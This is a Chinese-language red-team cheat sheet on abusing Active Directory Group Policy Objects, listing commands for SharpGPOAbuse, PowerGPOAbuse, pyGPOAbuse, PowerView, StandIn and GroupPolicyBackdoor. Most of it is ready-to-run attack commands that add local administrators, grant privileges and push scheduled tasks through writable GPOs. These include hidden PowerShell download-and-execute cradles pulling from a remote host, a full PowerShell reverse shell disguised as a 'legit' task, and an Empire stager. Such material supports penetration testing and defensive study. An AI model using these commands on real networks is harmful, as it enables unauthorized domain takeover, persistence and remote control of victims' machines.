# Active Directory - 组策略对象

> GPO 的创建者会自动获得显式的编辑设置、删除、修改安全权限，具体表现为 CreateChild、DeleteChild、Self、WriteProperty、DeleteTree、Delete、GenericRead、WriteDacl、WriteOwner

:triangular_flag_on_post: GPO 优先级：组织单位 > 域 > 站点 > 本地

GPO 存储在 DC 的 `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\` 中，包含 **User** 和 **Machine** 两个文件夹。
如果你有编辑 GPO 的权限，可以连接到 DC 并替换文件。计划任务位于 `Machine\Preferences\ScheduledTasks`。

:warning: 域成员每 90 分钟刷新一次组策略设置，并有 0 到 30 分钟的随机偏移，但可以使用以下命令在本地强制刷新：`gpupdate /force`。

## 查找易受攻击的 GPO

查找你拥有 **Write** 权限的 GPLink。

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
```

* [cogiceo/GPOHound](https://github.com/cogiceo/GPOHound) - 利用和丰富 BloodHound 数据的攻击性 GPO 导出和分析工具。

```ps1
pipx install "git+https://github.com/cogiceo/GPOHound"
gpohound dump --json
gpohound dump --list --gpo-name
gpohound dump --guid 21246D99-1426-495B-9E8E-556ABDD81F94
gpohound dump --file scripts psscripts
gpohound dump --search 'VNC.*Server' --show
gpohound analysis --json
gpohound analysis --processed --object group registry
gpohound analysis --guid CCF6CAE3-E280-4109-8F9D-25461DBB5D67 --affected
gpohound analysis --computer 'SRV-PA-03.NORTH.SEVENKINGDOMS.LOCAL' --order
gpohound analysis --enrich
```

## 使用 SharpGPOAbuse 滥用 GPO

* [FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) - SharpGPOAbuse 是一个用 C# 编写的 .NET 应用程序，可用于利用用户对组策略对象（GPO）的编辑权限来攻陷受该 GPO 控制的对象。

```powershell
# 构建和配置 SharpGPOAbuse
Install-Package CommandLineParser -Version 1.9.3.15
ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll

# 添加用户权限
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"

# 添加本地管理员
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

# 配置用户或计算机登录脚本
.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

# 配置计算机或用户即时任务
# /!\ 旨在每次 GPO 刷新时"运行一次"，而不是每个系统运行一次
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
```

## 使用 PowerGPOAbuse 滥用 GPO

* [rootSySdk/PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse) - SharpGPOAbuse 的 PowerShell 版本。

```ps1
PS> . .\PowerGPOAbuse.ps1

# 添加本地管理员
PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# 分配新权限
PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# 添加新的计算机/用户脚本
PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

# 创建即时任务
PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```

## 使用 pyGPOAbuse 滥用 GPO

* [Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) - SharpGPOAbuse 的部分 Python 实现。

```powershell
# 将 john 用户添加到本地管理员组（密码：H4x00r123..）
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"

# 反弹 Shell 示例
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
```

## 使用 PowerView 滥用 GPO

```powershell
# 枚举 GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# 使用 New-GPOImmediateTask 通过 VulnGPO 向机器推送 Empire stager
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

## 使用 StandIn 滥用 GPO

* [FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn) - StandIn 是一个小型的 .NET35/45 AD 后渗透工具套件。

```powershell
# 添加本地管理员
StandIn.exe --gpo --filter Shards --localadmin user002

# 为用户设置自定义权限
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"

# 执行自定义命令
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```

## 使用 GroupPolicyBackdoor 滥用 GPO

* [synacktiv/GroupPolicyBackdoor](https://github.com/synacktiv/GroupPolicyBackdoor) - 组策略对象操纵和利用框架

```ps1
# 向目标 GPO 添加即时任务
python3 gpb.py gpo inject --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --module modules_templates/ImmediateTask_create.ini --gpo-name 'TARGET_GPO'

# 清理
python3 gpb.py gpo clean --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --state-folder 'state_folders/2025_07_15_075047'
```

**ImmediateTask_create.ini**：

```ps1
[MODULECONFIG]
name = Scheduled Tasks
type = computer

[MODULEOPTIONS]
task_type = immediate
program = cmd.exe
arguments = /c "whoami > C:\Temp\poc.txt"

[MODULEFILTERS]
filters =
    [{
        "operator": "AND",
        "type": "Computer Name",
        "value": "ad01-srv1.corp.com"
    }]
```

## 参考资料

* [A Red Teamer's Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [Abusing sAMAccountName Hijacking in "GPP: Local Users and Groups" - @toffyrak - June 12, 2025](https://www.cogiceo.com/en/whitepaper_gpphijacking/)
* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
